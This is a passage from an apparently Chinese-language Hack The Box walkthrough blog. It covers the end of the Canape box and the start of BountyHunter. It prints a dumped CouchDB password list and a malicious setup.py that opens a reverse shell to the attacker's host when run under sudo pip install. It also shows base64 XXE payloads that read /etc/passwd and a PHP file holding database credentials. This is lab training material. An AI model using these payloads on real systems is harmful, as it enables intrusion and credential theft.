class="hljs-string">&quot;46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA&quot;</span>,<span class="hljs-string">&quot;sizes&quot;</span>:&#123;<span class="hljs-string">&quot;file&quot;</span>:222462,<span class="hljs-string">&quot;external&quot;</span>:665,<span class="hljs-string">&quot;active&quot;</span>:1740&#125;,<span class="hljs-string">&quot;purge_seq&quot;</span>:0,<span class="hljs-string">&quot;other&quot;</span>:&#123;<span class="hljs-string">&quot;data_size&quot;</span>:665&#125;,<span class="hljs-string">&quot;doc_del_count&quot;</span>:0,<span class="hljs-string">&quot;doc_count&quot;</span>:4,<span class="hljs-string">&quot;disk_size&quot;</span>:222462,<span class="hljs-string">&quot;disk_format_version&quot;</span>:6,<span class="hljs-string">&quot;data_size&quot;</span>:1740,<span class="hljs-string">&quot;compact_running&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;instance_start_time&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>&#125;<br>www-data@canape:/$ <br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5984</span><span class="hljs-regexp">/passwords/</span>_all_docs?include_docs=true -u world:world<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@canape:/$ curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=<span class="hljs-literal">true</span> -u world:world<br>&lt;p://127.0.0.1:5984/passwords/_all_docs?include_docs=<span class="hljs-literal">true</span> -u world:world     <br>&#123;<span class="hljs-string">&quot;total_rows&quot;</span>:4,<span class="hljs-string">&quot;offset&quot;</span>:0,<span class="hljs-string">&quot;rows&quot;</span>:[<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;2-81cf17b971d9229c54be92eeee723296&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;2-81cf17b971d9229c54be92eeee723296&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;ssh&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;0B4jyA0xtytZi7esBNGp&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;&#125;,<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;couchdb&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;r3lax0Nth3C0UCH&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;couchy&quot;</span>&#125;&#125;,<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;simpsonsfanclub.com&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;h02ddjdj2k2k2&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;homer&quot;</span>&#125;&#125;,<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438004738&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438004738&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438004738&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;homerj0121&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;STOP STORING YOUR PASSWORDS HERE -Admin&quot;</span>&#125;&#125;<br>]&#125;<br></code></pre></td></tr></table></figure><p>我看到了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH"><span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;ssh&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;0B4jyA0xtytZi7esBNGp&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;&#125;,<br></code></pre></td></tr></table></figure><p>但我不知道它是哪个用户的，哦我刚刚遍历home目录中，看到过一个homer的用户名，当然我想先试试root：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@10.10.10.70 -p 65535         <br>The authenticity of host <span class="hljs-string">&#x27;[10.10.10.70]:65535 ([10.10.10.70]:65535)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:fnOGcxmSP9f1PLBisr/nYMZP1ilGixOYS2kCQnYynxc.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[10.10.10.70]:65535<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">root@10.10.10.70&#x27;</span>s password: <br>Permission denied, please try again.<br>root@10.10.10.70<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">root@10.10.10.70&#x27;</span>s password: <br>root@10.10.10.70: Permission denied (publickey,password).<br></code></pre></td></tr></table></figure><p>好吧它不行，那我试试homer：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh homer@10.10.10.70 -p 65535<br>homer@10.10.10.70<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string">Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5</span><br><span class="hljs-string">homer@canape:~$ ls</span><br><span class="hljs-string">bin  data  erts-7.3  etc  lib  LICENSE  releases  share  user.txt  var</span><br><span class="hljs-string">homer@canape:~$ cat user.txt </span><br></code></pre></td></tr></table></figure><p>它可以，并且我得到了user.txt。既然有密码那么我可以尝试一下sudo -l：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">homer@canape:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> homer: <br>Matching Defaults entries <span class="hljs-keyword">for</span> homer on canape:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User homer may run the following commands on canape:<br>    (root) /usr/bin/pip install *<br></code></pre></td></tr></table></figure><p>它告诉我可以以root身份调用pip install 任何东西。我可以制定一个包含以下命令的setup.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup<br><span class="hljs-keyword">from</span> setuptools.command.install <span class="hljs-keyword">import</span> install<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-title class_ inherited__">install</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.connect((<span class="hljs-string">&quot;10.10.16.9&quot;</span>,<span class="hljs-number">4444</span>))<br>        os.dup2(s.fileno(),<span class="hljs-number">0</span>)<br>        os.dup2(s.fileno(),<span class="hljs-number">1</span>)<br>        os.dup2(s.fileno(),<span class="hljs-number">2</span>)<br>        p = subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>])<br><br>setup(<br>    cmdclass=&#123;<br>        <span class="hljs-string">&quot;install&quot;</span>: Exploit<br>    &#125;<br>)<br></code></pre></td></tr></table></figure><p>靶场自带的编辑器总是那么难用，我本地编辑再通过wget给目标送过去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 80                                                                                              <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.16.9:80/setup.py<br></code></pre></td></tr></table></figure><p>目标击中了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.70 - - [10/Apr/2022 23:02:05] <span class="hljs-string">&quot;GET /setup.py HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">homer@canape:~$ sudo pip install .<br>The directory <span class="hljs-string">&#x27;/home/homer/.cache/pip/http&#x27;</span> or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo<span class="hljs-string">&#x27;s -H flag.                                                                      </span><br><span class="hljs-string">The directory &#x27;</span>/home/homer/.cache/pip<span class="hljs-string">&#x27; or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo&#x27;</span>s -H flag.                                                                             <br>Processing /home/homer<br>Installing collected packages: UNKNOWN<br>  Running setup.py install <span class="hljs-keyword">for</span> UNKNOWN ... <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 4444        <br>listening on [any] 4444 ...<br>connect to [10.10.16.9] from (UNKNOWN) [10.10.10.70] 51994<br><span class="hljs-comment"># whoami                                                                      </span><br>root                                                                          <br><span class="hljs-comment"># cat /root/root.txt </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - BountyHunter</title>
    <link href="/post/HackTheBox-BountyHunter.html"/>
    <url>/post/HackTheBox-BountyHunter.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 08:58:31 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.100                                    <br>Discovered open port 22/tcp on 10.10.11.100 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 17:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.100<br>Host is up (0.21s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)<br>|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)<br>|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Bounty Hunters<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.53 seconds<br></code></pre></td></tr></table></figure><p>右上角有个按钮，点击后会被引导至此，尝试输入一些东西后也会回显至下方：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517171911861.png" alt="image-20220517171911861"  /><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/tracker_diRbPr00f314.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bountyhunters.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>225<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://bountyhunters.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://bountyhunters.htb/log_submit.php<br><br><span class="language-gcode">data=PD<span class="hljs-number">94</span>bWwgIHZlc<span class="hljs-symbol">nNpb249</span>IjEuMCIgZW<span class="hljs-number">5</span>jb<span class="hljs-number">2</span>Rpbmc<span class="hljs-number">9</span>IklTTy<span class="hljs-number">04</span>ODU<span class="hljs-number">5</span>LTEiPz<span class="hljs-number">4</span>KCQk<span class="hljs-number">8</span>Y<span class="hljs-symbol">nVncmVwb3</span>J<span class="hljs-number">0</span>PgoJCTx<span class="hljs-number">0</span>aXRsZT<span class="hljs-number">50</span>ZX<span class="hljs-symbol">N0</span>PC<span class="hljs-number">90</span>aXRsZT<span class="hljs-number">4</span>KCQk<span class="hljs-number">8</span>Y<span class="hljs-number">3</span>dlPm<span class="hljs-symbol">N3</span>ZTwvY<span class="hljs-number">3</span>dlPgoJCTxjd<span class="hljs-symbol">nNzPnNhZHNkc2</span>E<span class="hljs-number">8</span>L<span class="hljs-number">2</span><span class="hljs-symbol">N2</span>c<span class="hljs-number">3</span>M<span class="hljs-meta">%</span><span class="hljs-number">2</span>BCgkJPHJld<span class="hljs-number">2</span>FyZD<span class="hljs-number">4</span>xMDAwMDA<span class="hljs-number">8</span>L<span class="hljs-number">3</span>Jld<span class="hljs-number">2</span>FyZD<span class="hljs-number">4</span>KCQk<span class="hljs-number">8</span>L<span class="hljs-number">2</span>J<span class="hljs-number">1</span>Z<span class="hljs-number">3</span>Jlc<span class="hljs-name">G9</span>ydD<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>D</span><br></code></pre></td></tr></table></figure><p>后边两个是等于号，应该是被URL编码了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPmN3ZTwvY3dlPgoJCTxjdnNzPnNhZHNkc2E8L2N2c3M+CgkJPHJld2FyZD4xMDAwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=|<span class="hljs-built_in">base64</span> -d  <br>&lt;?xml  version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;<br>&lt;bugreport&gt;<br>&lt;title&gt;<span class="hljs-built_in">test</span>&lt;/title&gt;<br>&lt;cwe&gt;cwe&lt;/cwe&gt;<br>&lt;cvss&gt;sadsdsa&lt;/cvss&gt;<br>&lt;reward&gt;100000&lt;/reward&gt;<br>&lt;/bugreport&gt;<br></code></pre></td></tr></table></figure><p>可以尝试提交一个恶意XML文件将其进行BASE64编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">cat</span> XXE<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;<br>  &lt;!DOCTYPE foo [  <br>  &lt;!ELEMENT bar ANY &gt;<br>  &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;]&gt;<br>&lt;bugreport&gt;<br>&lt;title&gt;&amp;xxe;&lt;/title&gt;<br>&lt;cwe&gt;cwe&lt;/cwe&gt;<br>&lt;cvss&gt;sadsdsa&lt;/cvss&gt;<br>&lt;reward&gt;100000&lt;/reward&gt;<br>&lt;/bugreport&gt;<br>&gt;&gt; <span class="hljs-built_in">base64</span> -w0 XXE<br>PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/PgogIDwhRE9DVFlQRSBmb28gWyAgCiAgPCFFTEVNRU5UIGJhciBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+Y3dlPC9jd2U+CgkJPGN2c3M+c2Fkc2RzYTwvY3Zzcz4KCQk8cmV3YXJkPjEwMDAwMDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pgo=<br></code></pre></td></tr></table></figure><p>按CTRL + U 进行一次URL编码：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517173546192.png" alt="image-20220517173546192"  /><p>development用户看起来可以登录，但我无法读取ssh链接密钥，在收集路径信息时候看到了db.php：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[17:47:21] 301 -  323B  - /assets  -&gt;  http://bountyhunters.htb/assets/<br>[17:47:21] 403 -  282B  - /assets/<br>[17:47:29] 301 -  320B  - /css  -&gt;  http://bountyhunters.htb/css/<br>[17:47:30] 200 -    0B  - /db.php<br>[17:47:40] 200 -   25KB - /index.php<br>[17:47:40] 200 -   25KB - /index.php/login/<br>[17:47:42] 403 -  282B  - /js/<br>[17:47:58] 301 -  326B  - /resources  -&gt;  http://bountyhunters.htb/resources/<br>[17:47:58] 200 -    3KB - /resources/<br>[17:48:00] 403 -  282B  - /server-status/<br>[17:48:00] 403 -  282B  - /server-status<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">cat</span> XXE<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;<br>  &lt;!DOCTYPE foo [  <br>  &lt;!ELEMENT bar ANY &gt;<br>  &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;</span> &gt;]&gt;<br>&lt;bugreport&gt;<br>&lt;title&gt;&amp;xxe;&lt;/title&gt;<br>&lt;cwe&gt;cwe&lt;/cwe&gt;<br>&lt;cvss&gt;sadsdsa&lt;/cvss&gt;<br>&lt;reward&gt;100000&lt;/reward&gt;<br>&lt;/bugreport&gt;<br>&gt;&gt; <span class="hljs-built_in">base64</span> -w0 XXE<br>PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/PgogIDwhRE9DVFlQRSBmb28gWyAgCiAgPCFFTEVNRU5UIGJhciBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9kYi5waHAiID5dPgoJCTxidWdyZXBvcnQ+CgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPmN3ZTwvY3dlPgoJCTxjdnNzPnNhZHNkc2E8L2N2c3M+CgkJPHJld2FyZD4xMDAwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4K<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -X POST -d <span class="hljs-string">&quot;data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/PgogIDwhRE9DVFlQRSBmb28gWyAgCiAgPCFFTEVNRU5UIGJhciBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9kYi5waHAiID5dPgoJCTxidWdyZXBvcnQ%2bCgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPmN3ZTwvY3dlPgoJCTxjdnNzPnNhZHNkc2E8L2N2c3M%2bCgkJPHJld2FyZD4xMDAwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4K&quot;</span> http://bountyhunters.htb/tracker_diRbPr00f314.php<br>If DB were ready, would have added:<br>&lt;table&gt;<br>  &lt;<span class="hljs-built_in">tr</span>&gt;<br>    &lt;td&gt;Title:&lt;/td&gt;<br>    &lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt;<br>  &lt;/tr&gt;<br>  &lt;<span 